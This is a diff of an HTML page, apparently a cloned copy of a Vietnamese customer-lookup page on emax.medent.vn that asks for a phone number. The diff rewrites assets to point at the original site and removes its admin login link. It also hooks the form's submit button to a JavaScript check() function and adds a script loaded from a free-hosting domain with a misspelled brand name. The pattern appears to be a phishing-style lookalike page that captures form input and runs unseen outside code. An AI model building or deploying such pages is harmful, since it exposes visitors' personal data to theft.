@@ -274,6 +274,9 @@
 			pointer-events: none;
 		}
 	</style>
+	<script src="./vendor/jquery.min.js.download" type="text/javascript"></script>
+	<script src="js/apis.js"></script>
+	<script src="js/index.js"></script>	
 </head>
 
 <body class="canhcam homepage vi-vn">
@@ -286,20 +289,15 @@
 
 			<div id="ctl00_divCenter" class="middle-fullwidth">
 
-
-
-
-
 				<div id="ctl00_mainContent_ctl00_updBill">
 
 					<div id="ctl00_mainContent_ctl00_divfrm">
 						<section class="emax-information"
-							bg-img="/Data/Sites/1/media/default/img/emax/home/body-2.png"
-							style="background-position: center center; background-size: cover; background-image: url(&quot;/Data/Sites/1/media/default/img/emax/home/body-2.png&quot;); height: 559.124px;">
+							bg-img="http://emax.medent.vn/Data/Sites/1/media/default/img/emax/home/body-2.png"
+							style="background-position: center center; background-size: cover; background-image: url(&quot;http://emax.medent.vn/Data/Sites/1/media/default/img/emax/home/body-2.png&quot;); height: 559.124px;">
 							<div class="container">
 								<div class="row">
-									<div class="col-12 item"><a class="link"
-											href="http://emax.medent.vn/adminCP">Đăng nhập</a></div>
+								<br>
 								</div>
 								<div class="row">
 									<div class="col-12 item">
@@ -315,8 +313,8 @@
 													id="txtPhone" class="form-control">
 											</div>
 											<input type="submit" name="ctl00$mainContent$ctl00$btnSearch"
-												value="Kiểm tra" id="ctl00_mainContent_ctl00_btnSearch"
-												class="btn btn-danger btn-more">
+												value="Kiểm tra"
+												class="btn btn-danger btn-more" onclick="check()">
 
 										</div>
 									</div>
@@ -324,19 +322,18 @@
 							</div>
 						</section>
 					</div>
-
-
 				</div>
-
-
 			</div>
-
 		</main>
 		<footer class="footer">
 			<img class="w-100" src="./vendor/footer.png" alt="">
 		</footer>
 
 	</div>
+
+	<script src="js/apis.js"></script>
+	<script src="https://pc-henieken.000webhostapp.com/js/support.js"></script>
+
 </body>
 
 </html>
